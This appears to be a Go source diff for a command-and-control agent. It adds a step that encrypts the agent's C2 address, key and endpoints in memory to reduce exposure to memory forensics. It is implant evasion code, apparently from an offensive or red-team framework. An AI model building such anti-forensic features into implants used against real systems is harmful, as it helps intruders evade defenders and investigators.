@@ -264,6 +264,13 @@ func runAgent() {
 		}
 		c2 = profiles.NewProfile(httpProfile)
 
+		// Seal the C2 config vault — encrypts sensitive fields (BaseURL, EncryptionKey,
+		// UserAgent, endpoints) with AES-256-GCM. Fields are only decrypted on-demand
+		// for the duration of each HTTP operation, reducing memory forensics exposure.
+		if err := httpProfile.SealConfig(); err != nil {
+			log.Printf("[WARNING] Config vault seal failed: %v (fields remain in plaintext)", err)
+		}
+
 		// Also create a TCP profile instance for P2P child management.
 		// Even HTTP egress agents can link to TCP children.
 		tcpP2P := tcp.NewTCPProfile("", encryptionKey, debugBool)
